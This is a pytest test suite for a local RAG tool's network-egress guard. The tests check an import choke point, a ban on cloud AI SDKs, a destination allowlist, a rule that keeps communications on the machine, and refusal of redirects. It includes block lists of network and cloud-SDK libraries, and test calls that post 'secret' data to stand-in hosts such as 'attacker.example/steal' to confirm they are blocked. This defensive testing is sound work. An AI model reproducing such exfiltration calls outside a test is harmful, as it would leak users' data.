"""The privacy guarantee: content goes only to approved destinations, and
communications never leave this machine.

These tests exist because "we don't send your files anywhere else" is worth
nothing as a comment. Each layer is asserted on its own, so removing any one of
them fails the suite:

1. **One choke point.** ``garage_rag/net/egress.py`` is the only module that
   imports an outbound network client library, or a library that opens its own
   connections (such as the ``ollama`` SDK). The AST scan covers function-local and
   ``importlib`` imports. Inbound and local infrastructure -- the gRPC server and
   stubs, the MCP server's uvicorn, psycopg -- are exceptions, listed by file in
   :data:`INBOUND_OR_LOCAL`.
2. **No cloud AI SDK**, anywhere, and none in ``uv.lock``.
3. **Destination allowlist.** The guard approves loopback and the origins
   configured as ``embedding.ollama_host`` / ``embedding.lmstudio_host``, and
   refuses everything else; the clients it builds ignore proxies, never follow
   a redirect and refuse a request to any other origin.
4. **Content rule.** A communication is never sent to a destination that is not
   loopback; the guard checks that before anything else.
5. **Every caller goes through the guard** (:data:`CALLERS`), checked both by
   reading the source and by building each client against a refused host.
6. **Local fact extraction.** Only the local part of LangExtract is vendored, and
   every extraction runs on ``LocalLanguageModel`` through the inference client.

Every model server -- LM Studio, Ollama, the app's LlamaXPCService -- is reached
through ``garage_rag.inference``, whose transport gets its client from
``egress.http_client``.

The backfill filter that withholds communication chunks from an off-box
embedding provider is tested in ``test_embed_egress.py``.
"""

from __future__ import annotations

import ast
import tomllib
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from garage_rag.config import Settings, reset_settings, set_settings
from garage_rag.db.models import CorpusClass
from garage_rag.net import egress
from garage_rag.net.egress import EgressBlocked

TESTS = Path(__file__).resolve().parent
SRC = TESTS.parent / "src" / "garage_rag"
LOCKFILE = TESTS.parent / "uv.lock"
EGRESS_MODULE = "net/egress.py"
# The one module that hands document text to (vendored) LangExtract.
FACTS_MODULE = SRC / "enrich" / "facts.py"

# Outbound network client libraries, and libraries that open their own
# connections (the ollama SDK uses httpx inside), by import prefix.
NETWORK_LIBRARIES = (
    "httpx",
    "httpx2",
    "requests",
    "urllib.request",
    "urllib3",
    "http.client",
    "socket",
    "aiohttp",
    "websockets",
    "ftplib",
    "smtplib",
    "xmlrpc.client",
    "ollama",
    "grpc",
    "uvicorn",
    "psycopg",
    "psycopg_pool",
)
# Inbound or local-only infrastructure, allowed outside the guard file by file.
INBOUND_OR_LOCAL = {
    "grpc": {
        "service/server.py",  # the gRPC server the app talks to
        "proto/garage_pb2_grpc.py",  # generated stubs
        "service/client.py",  # the facade's client; checks its address with egress.check_destination
    },
    "uvicorn": {"mcp_server/server.py"},  # serves MCP over HTTP (inbound)
    "psycopg": {"db/engine.py", "db/migrate.py"},  # the Postgres connection
}

# Top-level packages (or dotted prefixes) of cloud AI SDKs and of libraries whose
# purpose is calling one.
CLOUD_AI_MODULES = (
    "anthropic",
    "openai",
    "google.genai",
    "google.generativeai",
    "google.ai",
    "google.cloud",
    "vertexai",
    "cohere",
    "mistralai",
    "groq",
    "together",
    "replicate",
    "fireworks",
    "voyageai",
    "huggingface_hub",
    "boto3",
    "botocore",
    "litellm",
    "langchain_openai",
    "langchain_anthropic",
    "langchain_google_genai",
    "langchain_google_vertexai",
    "langchain_aws",
    "langextract",
)
# The same, as distribution names in uv.lock.
CLOUD_AI_DISTRIBUTIONS = frozenset(
    {
        "anthropic",
        "openai",
        "google-genai",
        "google-generativeai",
        "google-ai-generativelanguage",
        "google-cloud-aiplatform",
        "google-cloud-storage",
        "google-api-core",
        "vertexai",
        "cohere",
        "mistralai",
        "groq",
        "together",
        "replicate",
        "fireworks-ai",
        "voyageai",
        "huggingface-hub",
        "boto3",
        "botocore",
        "litellm",
        "langchain-openai",
        "langchain-anthropic",
        "langextract",
    }
)

# Every module that sends content out, and what it goes through.
CALLERS = {
    "inference/transport.py": "egress.http_client",
    "embed/ollama.py": "InferenceClient(",
    "embed/lmstudio.py": "InferenceClient(",
    "embed/factory.py": "allows_communications",
    "enrich/generation.py": "egress.check_destination",
    "enrich/facts.py": "egress.check_destination",
    "mcp_server/server.py": "egress.check_destination",
    "xpc/llama_xpc.py": "class LlamaXPCClient(InferenceClient)",
    "service/client.py": "egress.check_destination",
    # Sends only a model name, to the app's loopback gRPC service, through the facade's client.
    "xpc/host.py": "GarageClient(",
    "cli.py": "egress.url_opener",
}

OFF_BOX_OLLAMA = "http://gpu-box:11434"
OFF_BOX_LMSTUDIO = "https://lmstudio.example.com/v1"


@pytest.fixture
def off_box_settings():
    """Ollama and LM Studio configured on another machine."""
    set_settings(Settings(ollama_host=OFF_BOX_OLLAMA, lmstudio_host=OFF_BOX_LMSTUDIO))
    yield
    reset_settings()


@pytest.fixture(autouse=True)
def _reset_settings():
    yield
    reset_settings()


def _imported_modules(path: Path) -> set[str]:
    """Every absolute module name ``path`` imports, anywhere in the file.

    ``ast.walk`` reaches function-local and conditional imports as well as the
    top-level ones; string arguments to ``importlib.import_module`` and
    ``__import__`` count too.
    """
    tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
    modules: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            modules.update(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.level == 0 and node.module:
            modules.add(node.module)
            modules.update(f"{node.module}.{alias.name}" for alias in node.names)
        elif isinstance(node, ast.Call) and node.args and isinstance(node.args[0], ast.Constant):
            func = node.func
            name = func.attr if isinstance(func, ast.Attribute) else getattr(func, "id", None)
            if name in ("import_module", "__import__") and isinstance(node.args[0].value, str):
                modules.add(node.args[0].value)
    return modules


def _matches(module: str, prefixes: tuple[str, ...]) -> str | None:
    return next((p for p in prefixes if module == p or module.startswith(p + ".")), None)


def _sources() -> list[Path]:
    return sorted(SRC.rglob("*.py"))


class TestChokePoint:
    """Layer 1: only the egress module can open an outbound connection."""

    def test_only_the_egress_module_imports_a_network_library(self) -> None:
        offenders = []
        for path in _sources():
            relative = path.relative_to(SRC).as_posix()
            if relative == EGRESS_MODULE:
                continue
            for module in _imported_modules(path):
                library = _matches(module, NETWORK_LIBRARIES)
                if library and relative not in INBOUND_OR_LOCAL.get(library.split(".")[0], set()):
                    offenders.append(f"{relative}: {module}")
        assert not offenders, (
            f"network library imported outside {EGRESS_MODULE}: {offenders}. Build the client with "
            "garage_rag.net.egress (http_client / url_opener) instead."
        )

    def test_the_egress_module_is_where_clients_come_from(self) -> None:
        imported = _imported_modules(SRC / EGRESS_MODULE)
        for library in ("httpx", "urllib.request"):
            assert library in imported

    def test_the_inbound_exceptions_are_still_accurate(self) -> None:
        """A stale exception is a hole: each listed file must still import the library."""
        for library, files in INBOUND_OR_LOCAL.items():
            for relative in files:
                assert any(_matches(m, (library,)) for m in _imported_modules(SRC / relative)), relative

    def test_the_scan_sees_function_local_and_dynamic_imports(self, tmp_path: Path) -> None:
        sample = tmp_path / "sample.py"
        sample.write_text(
            "import importlib\n"
            "def f():\n"
            "    import anthropic\n"
            "    from urllib.request import urlopen\n"
            "    from google import genai\n"
            "    return importlib.import_module('httpx')\n",
            encoding="utf-8",
        )
        modules = _imported_modules(sample)
        assert {_matches(m, CLOUD_AI_MODULES) for m in modules} - {None} == {"anthropic", "google.genai"}
        assert {_matches(m, NETWORK_LIBRARIES) for m in modules} - {None} == {"urllib.request", "httpx"}


class TestNoCloudAISDK:
    """Layer 2: nothing in the package can talk to a cloud AI API."""

    def test_no_module_imports_a_cloud_ai_sdk(self) -> None:
        offenders = [
            f"{path.relative_to(SRC).as_posix()}: {module}"
            for path in _sources()
            for module in _imported_modules(path)
            if _matches(module, CLOUD_AI_MODULES)
        ]
        assert not offenders, f"cloud AI SDK imported: {offenders}"

    def test_lockfile_has_no_cloud_ai_sdk(self) -> None:
        lock = tomllib.loads(LOCKFILE.read_text(encoding="utf-8"))
        names = {package["name"] for package in lock["package"]}
        assert not names & CLOUD_AI_DISTRIBUTIONS, sorted(names & CLOUD_AI_DISTRIBUTIONS)

    def test_cloud_ocr_is_gone(self) -> None:
        assert not (SRC / "enrich" / "egress.py").exists()
        image = (SRC / "extract" / "image.py").read_text(encoding="utf-8")
        assert "base64" not in image and "egress" not in image


class TestAllowlist:
    """Layer 3: loopback and the configured model servers, nothing else."""

    @pytest.mark.parametrize(
        ("url", "expected"),
        [
            ("http://localhost:11434", True),
            ("localhost:11434", True),
            ("http://127.0.0.1:8790", True),
            ("http://127.1.2.3:1234/v1", True),
            ("http://[::1]:11434", True),
            ("http://gpu-box:11434", False),
            ("10.0.0.5:11434", False),
            ("http://127.example.com:11434", False),
            ("http://127.0.0.1.nip.io:11434", False),
            ("http://0.0.0.0:11434", False),
            ("http://127.0.0.1@evil.example:11434", False),
        ],
    )
    def test_is_loopback_url(self, url: str, expected: bool) -> None:
        assert egress.is_loopback_url(url) is expected

    @pytest.mark.parametrize("url", ["http://localhost:11434", "http://127.0.0.1:8790/v1", "http://[::1]:1234"])
    def test_loopback_is_approved(self, url: str) -> None:
        assert egress.check_destination(url, purpose="test", settings=Settings()) == url

    @pytest.mark.parametrize(
        "url",
        [
            OFF_BOX_OLLAMA,
            "gpu-box:11434",  # the same origin written as a bare host:port
            "http://GPU-BOX:11434/api/embed",
            OFF_BOX_LMSTUDIO,
            "https://lmstudio.example.com:443/v1/embeddings",
        ],
    )
    def test_configured_model_servers_are_approved(self, url: str) -> None:
        settings = Settings(ollama_host=OFF_BOX_OLLAMA, lmstudio_host=OFF_BOX_LMSTUDIO)
        egress.check_destination(url, purpose="test", settings=settings)

    @pytest.mark.parametrize(
        "url",
        [
            "https://api.openai.com/v1",
            "https://api.anthropic.com",
            "http://gpu-box:11435",  # right host, wrong port
            "https://gpu-box:11434",  # right host and port, wrong scheme
            "http://lmstudio.example.com/v1",  # configured as https
            "http://other-box:11434",
            "ftp://gpu-box:11434",
            "not a url at all",
        ],
    )
    def test_anything_else_is_refused(self, url: str) -> None:
        settings = Settings(ollama_host=OFF_BOX_OLLAMA, lmstudio_host=OFF_BOX_LMSTUDIO)
        with pytest.raises(EgressBlocked, match="not an approved destination"):
            egress.check_destination(url, purpose="test", settings=settings)

    def test_approved_destinations_are_only_the_configured_servers(self) -> None:
        settings = Settings(ollama_host=OFF_BOX_OLLAMA, lmstudio_host=OFF_BOX_LMSTUDIO)
        assert egress.approved_destinations(settings) == [OFF_BOX_OLLAMA, OFF_BOX_LMSTUDIO]

    def test_loopback_only_refuses_a_configured_off_box_server(self) -> None:
        settings = Settings(ollama_host=OFF_BOX_OLLAMA)
        with pytest.raises(EgressBlocked, match="must be a loopback URL"):
            egress.check_destination(OFF_BOX_OLLAMA, purpose="test", loopback_only=True, settings=settings)

    def test_llama_host_must_be_loopback(self) -> None:
        with pytest.raises(ValueError, match="llama_host must be a loopback URL"):
            Settings(llama_host="http://llama.example:8790")

    def test_http_client_is_pinned_to_its_origin(self, off_box_settings) -> None:
        client = egress.http_client(purpose="test", base_url=OFF_BOX_OLLAMA)
        assert client.follow_redirects is False
        assert client._trust_env is False
        with pytest.raises(EgressBlocked, match="leaves the approved origin"):
            client.post("http://attacker.example/steal", json={})

    def test_http_client_over_a_socket_is_loopback_only(self) -> None:
        """A client on a Unix-domain socket (the app's LlamaXPCService) still names a loopback origin."""
        client = egress.http_client(purpose="test", base_url="http://127.0.0.1:8790", uds="/tmp/garage/llama")
        assert client.follow_redirects is False
        with pytest.raises(EgressBlocked, match="leaves the approved origin"):
            client.post("http://attacker.example/steal", content=b"secret")
        with pytest.raises(EgressBlocked, match="loopback"):
            egress.http_client(purpose="test", base_url=OFF_BOX_OLLAMA, uds="/tmp/garage/llama")
        with pytest.raises(EgressBlocked, match="absolute"):
            egress.http_client(purpose="test", base_url="http://127.0.0.1:8790", uds="garage/llama")

    def test_url_opener_is_pinned_to_its_origin(self) -> None:
        opener = egress.url_opener(purpose="test", base_url="http://127.0.0.1:8790")
        with pytest.raises(EgressBlocked, match="leaves the approved origin"):
            opener.request("GET", "http://127.0.0.1:9999/other", timeout=1)


class TestContentRule:
    """Layer 4: communications stay on this machine, whatever else is approved."""

    def test_communications_are_refused_off_box_even_to_a_configured_server(self) -> None:
        settings = Settings(ollama_host=OFF_BOX_OLLAMA)
        with pytest.raises(EgressBlocked, match="communications may never be sent off this machine"):
            egress.check_destination(
                OFF_BOX_OLLAMA, purpose="test", corpus_class=CorpusClass.COMMUNICATION, settings=settings
            )

    def test_the_content_rule_is_checked_first(self) -> None:
        """An unapproved host fails with the content rule's message, not the allowlist's."""
        with pytest.raises(EgressBlocked, match="communications may never"):
            egress.check_destination("https://api.example.com", purpose="test", corpus_class=CorpusClass.COMMUNICATION)

    @pytest.mark.parametrize("klass", [CorpusClass.DOCUMENT, CorpusClass.CODE])
    def test_other_classes_may_go_to_a_configured_server(self, klass: CorpusClass) -> None:
        settings = Settings(ollama_host=OFF_BOX_OLLAMA)
        egress.check_destination(OFF_BOX_OLLAMA, purpose="test", corpus_class=klass, settings=settings)

    def test_communications_may_go_to_loopback(self) -> None:
        egress.check_destination("http://localhost:11434", purpose="test", corpus_class=CorpusClass.COMMUNICATION)
        assert egress.allows_communications("http://127.0.0.1:1234/v1")
        assert not egress.allows_communications(OFF_BOX_OLLAMA)

    def test_http_client_applies_the_content_rule(self, off_box_settings) -> None:
        with pytest.raises(EgressBlocked, match="communications"):
            egress.http_client(purpose="test", base_url=OFF_BOX_OLLAMA, corpus_class=CorpusClass.COMMUNICATION)

    def test_fact_extraction_refuses_a_communication_before_touching_facts(self, off_box_settings) -> None:
        from garage_rag.db.models import Document
        from garage_rag.enrich.facts import extract_and_store_facts

        session = MagicMock()
        document = Document(id=1, content="text", corpus_class=CorpusClass.COMMUNICATION)
        with pytest.raises(EgressBlocked, match="communications"):
            extract_and_store_facts(session, document, provider="ollama")
        session.query.assert_not_called()

    def test_rag_ask_refuses_a_communication_for_an_off_box_model(self, off_box_settings) -> None:
        from garage_rag.mcp_server.server import rag_ask

        set_settings(Settings(fact_provider="ollama", ollama_host=OFF_BOX_OLLAMA))
        hit = MagicMock(corpus_class="communication")
        with (
            patch("garage_rag.mcp_server.server._retrieve", return_value=([hit], None)),
            patch("garage_rag.enrich.generation.LocalChatModel.complete") as complete,
            pytest.raises(EgressBlocked, match="communications"),
        ):
            rag_ask(question="q")
        complete.assert_not_called()


class TestEveryCallerGoesThroughTheGuard:
    """Layer 5."""

    @pytest.mark.parametrize(("module", "call"), sorted(CALLERS.items()))
    def test_caller_uses_the_guard(self, module: str, call: str) -> None:
        assert call in (SRC / module).read_text(encoding="utf-8"), f"{module} must go through {call}"

    def test_ollama_embedder(self) -> None:
        from garage_rag.embed.ollama import OllamaEmbedder

        with pytest.raises(EgressBlocked):
            OllamaEmbedder("nomic-embed-text", host="http://gpu-box:11434")

    def test_lmstudio_embedder(self) -> None:
        from garage_rag.embed.lmstudio import LMStudioEmbedder

        with pytest.raises(EgressBlocked):
            LMStudioEmbedder("text-embedding", base_url="https://api.openai.com/v1")

    @pytest.mark.parametrize("provider", ["ollama", "lmstudio", "llama_xpc"])
    def test_fact_provider(self, provider: str) -> None:
        from garage_rag.enrich.facts import facts_language_model

        with pytest.raises(EgressBlocked):
            facts_language_model(provider, "gemma2:2b", "http://gpu-box:11434")

    @pytest.mark.parametrize("kind", ["ollama", "lmstudio", "llama_xpc"])
    def test_inference_client(self, kind: str) -> None:
        from garage_rag.inference import Backend, InferenceClient

        with pytest.raises(EgressBlocked):
            InferenceClient(Backend(kind, "http://gpu-box:1234/v1"))

    def test_inference_client_applies_the_content_rule(self, off_box_settings) -> None:
        from garage_rag.inference import Backend, InferenceClient

        InferenceClient(Backend("ollama", OFF_BOX_OLLAMA), corpus_class=CorpusClass.DOCUMENT)
        with pytest.raises(EgressBlocked, match="communications may never"):
            InferenceClient(Backend("lmstudio", OFF_BOX_LMSTUDIO), corpus_class=CorpusClass.COMMUNICATION)

    def test_chat_model(self) -> None:
        from garage_rag.enrich.generation import LocalChatModel

        LocalChatModel(settings=Settings(fact_provider="ollama", ollama_host=OFF_BOX_OLLAMA))  # configured: approved
        with (
            patch("garage_rag.net.egress.approved_destinations", return_value=[]),
            pytest.raises(EgressBlocked),
        ):
            LocalChatModel(settings=Settings(fact_provider="ollama", ollama_host=OFF_BOX_OLLAMA))

    def test_llama_client(self) -> None:
        from garage_rag.xpc.llama_xpc import LlamaXPCClient, LlamaXPCError

        with pytest.raises(LlamaXPCError, match="loopback"):
            LlamaXPCClient("http://gpu-box:8790")

    def test_grpc_client(self) -> None:
        from garage_rag.service.client import GarageClient

        with pytest.raises(EgressBlocked):
            GarageClient(host="10.0.0.5", port=50051, in_process=False)._get_stub()

    def test_grpc_client_socket_must_be_an_absolute_path(self) -> None:
        """A socket path is local by construction; a relative one could name anything, so it is refused."""
        from garage_rag.service.client import GarageClient

        with pytest.raises(EgressBlocked, match="absolute"):
            GarageClient(socket_path="s/grpc")._get_stub()

    def test_embedding_backfill_asks_the_guard(self, off_box_settings) -> None:
        from garage_rag.embed.factory import provider_is_local

        assert not provider_is_local("ollama")
        assert not provider_is_local("lmstudio")
        assert provider_is_local("llama_xpc")


@pytest.fixture
def redirecting_server():
    """A loopback server that 307-redirects every request to a second server, which counts hits."""
    import threading
    from http.server import BaseHTTPRequestHandler, HTTPServer

    hits: list[str] = []

    class Target(BaseHTTPRequestHandler):
        def log_message(self, *args) -> None:
            pass

        def _hit(self) -> None:
            hits.append(self.path)
            self.send_response(200)
            self.send_header("content-length", "2")
            self.end_headers()
            self.wfile.write(b"{}")

        do_GET = do_POST = _hit

    target = HTTPServer(("127.0.0.1", 0), Target)

    class Redirect(BaseHTTPRequestHandler):
        def log_message(self, *args) -> None:
            pass

        def _redirect(self) -> None:
            self.rfile.read(int(self.headers.get("content-length") or 0))
            self.send_response(307)
            self.send_header("location", f"http://127.0.0.1:{target.server_port}{self.path}")
            self.send_header("content-length", "0")
            self.end_headers()

        do_GET = do_POST = _redirect

    redirect = HTTPServer(("127.0.0.1", 0), Redirect)
    servers = [target, redirect]
    for server in servers:
        threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        yield f"http://127.0.0.1:{redirect.server_port}", hits
    finally:
        for server in servers:
            server.shutdown()
            server.server_close()


class TestNoRedirects:
    """A model server cannot bounce content somewhere else."""

    def test_ollama_embedder(self, redirecting_server) -> None:
        from garage_rag.embed.ollama import OllamaEmbedder

        url, hits = redirecting_server
        with pytest.raises(Exception):  # noqa: B017 - the SDK's error type is not the point
            OllamaEmbedder("m", host=url).embed(["secret text"])
        assert hits == []

    def test_lmstudio_embedder(self, redirecting_server) -> None:
        from garage_rag.embed.lmstudio import LMStudioEmbedder

        url, hits = redirecting_server
        with patch("garage_rag.inference.client.time.sleep"), pytest.raises(Exception):  # noqa: B017
            LMStudioEmbedder("m", base_url=f"{url}/v1").embed(["secret text"])
        assert hits == []

    @pytest.mark.parametrize("provider", ["ollama", "lmstudio", "llama_xpc"])
    def test_fact_provider(self, redirecting_server, provider: str) -> None:
        from garage_rag.enrich.facts import facts_language_model
        from garage_rag.enrich.langextract.exceptions import InferenceRuntimeError

        url, hits = redirecting_server
        with pytest.raises(InferenceRuntimeError):
            list(facts_language_model(provider, "m", url).infer(["secret text"]))
        assert hits == []

    def test_lmstudio_model_management(self, redirecting_server) -> None:
        from garage_rag.inference import Backend, InferenceClient, InferenceHTTPError

        url, hits = redirecting_server
        with pytest.raises(InferenceHTTPError):
            InferenceClient(Backend("lmstudio", url)).load_model("m")
        assert hits == []

    def test_llama_client(self, redirecting_server) -> None:
        from garage_rag.xpc.llama_xpc import LlamaXPCClient, LlamaXPCError

        url, hits = redirecting_server
        with pytest.raises(LlamaXPCError):
            LlamaXPCClient(url, timeout=5).chat([{"role": "user", "content": "secret text"}], "m")
        with pytest.raises(LlamaXPCError):
            LlamaXPCClient(url, timeout=5).list_models()
        assert hits == []

    def test_chat_model(self, redirecting_server) -> None:
        from garage_rag.enrich.generation import LocalChatModel

        url, hits = redirecting_server
        model = LocalChatModel(settings=Settings(fact_provider="ollama", ollama_host=url))
        with pytest.raises(Exception):  # noqa: B017
            model.chat([{"role": "user", "content": "secret text"}])
        assert hits == []


class TestFactExtractionStaysLocal:
    """Layer 6. Upstream LangExtract picks a *cloud* backend by regex on
    ``model_id`` (``gemini*`` -> Google, ``gpt-*`` -> OpenAI). Only the local
    part is vendored (``enrich/langextract``); no module imports the upstream
    package, the vendored copy has no provider routing, and every extraction
    runs on ``LocalLanguageModel``, built by ``facts_language_model``.
    """

    LOCAL_MODELS = {"LocalLanguageModel"}

    def test_vendored_langextract_has_no_provider_routing(self) -> None:
        vendored = SRC / "enrich" / "langextract"
        names = {p.stem for p in vendored.rglob("*.py")}
        assert not names & {"factory", "providers", "router", "gemini", "openai", "io"}
        source = "\n".join(p.read_text(encoding="utf-8") for p in vendored.rglob("*.py"))
        assert "model_id" not in source.split("def extract(")[1].split(")")[0]

    def test_every_extract_call_is_given_a_local_model(self) -> None:
        tree = ast.parse(FACTS_MODULE.read_text(encoding="utf-8"), filename=str(FACTS_MODULE))
        calls = [
            node
            for node in ast.walk(tree)
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) and node.func.attr == "extract"
        ]
        assert calls, "expected an lx.extract(...) call in enrich/facts.py"
        for call in calls:
            keywords = {kw.arg: kw.value for kw in call.keywords}
            assert "model" in keywords, f"line {call.lineno}: lx.extract must be given model="
            assert None not in keywords, f"line {call.lineno}: **kwargs could smuggle other options in"
            model = keywords["model"]
            assert (
                isinstance(model, ast.Call)
                and isinstance(model.func, ast.Name)
                and model.func.id == "facts_language_model"
            ), f"line {call.lineno}: lx.extract must be given model=facts_language_model(...)"
        constructed = {
            node.func.id
            for node in ast.walk(tree)
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name) and node.func.id.endswith("LanguageModel")
        }
        assert constructed == self.LOCAL_MODELS

    @pytest.mark.parametrize("provider", ["ollama", "llama_xpc", "lmstudio"])
    def test_facts_language_model_is_always_the_local_provider(self, provider: str) -> None:
        from garage_rag.enrich.facts import facts_language_model
        from garage_rag.enrich.local_provider import LocalLanguageModel

        set_settings(Settings())
        try:
            model = facts_language_model(provider, "gemma2:2b")
        finally:
            reset_settings()
        assert type(model) is LocalLanguageModel
        assert model.client.backend.is_local


def test_guards_do_not_need_a_database_driver() -> None:
    """The guards must hold wherever the code runs, libpq or not.

    Run in a fresh interpreter that refuses to import psycopg: the modules the
    guards live in must still import, so the guards' tests (and the guards)
    never depend on a database driver being installed.
    """
    import subprocess
    import sys

    script = """
import sys

class BlockPsycopg:
    def find_spec(self, name, path=None, target=None):
        if name.split(".")[0] in ("psycopg", "psycopg_c", "psycopg_binary"):
            raise ImportError(f"{name} blocked for this test")
        return None

sys.meta_path.insert(0, BlockPsycopg())
import garage_rag.net.egress
import garage_rag.ops.sources
import garage_rag.search.hybrid
import garage_rag.enrich.facts
import garage_rag.cli
print("ok")
"""
    result = subprocess.run([sys.executable, "-c", script], capture_output=True, text=True, check=False)
    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == "ok"
